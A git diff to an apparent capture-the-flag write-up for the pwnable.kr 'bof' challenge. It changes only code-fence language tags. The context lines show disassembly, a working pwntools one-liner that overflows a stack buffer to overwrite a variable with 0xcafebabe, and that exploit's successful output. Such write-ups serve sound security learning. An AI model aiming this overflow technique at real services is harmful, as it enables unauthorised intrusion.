@@ -37,8 +37,9 @@ unsigned int __cdecl func(int a1)
   return __readgsdword(0x14u) ^ v3;
 }
 ```
+
 IDA disassemable：
-```
+```asm
 .text:0000062C s               = byte ptr -2Ch
 .text:0000062C var_C           = dword ptr -0Ch
 .text:0000062C arg_0           = dword ptr  8
@@ -81,7 +82,7 @@ IDA disassemable：
 ```
 
 EXP:
-```
+```bash
 ➜  3-bof git:(master) ✗ python -c "from pwn import *;r=remote('pwnable.kr',9000);payload='A'*0x34+'\xBE\xBA\xFE\xCA';r.sendline(payload);r.interactive()"
 [+] Opening connection to pwnable.kr on port 9000: Done
 [*] Switching to interactive mode
@@ -103,7 +104,7 @@ daddy, I just pwned a buFFer :)
 
 ## TIPS
 canary is got from gs:14 and saved in [ebp-0xC].
-```
+```asm
 .text:0000062C                 push    ebp
 .text:0000062D                 mov     ebp, esp
 .text:0000062F                 sub     esp, 48h
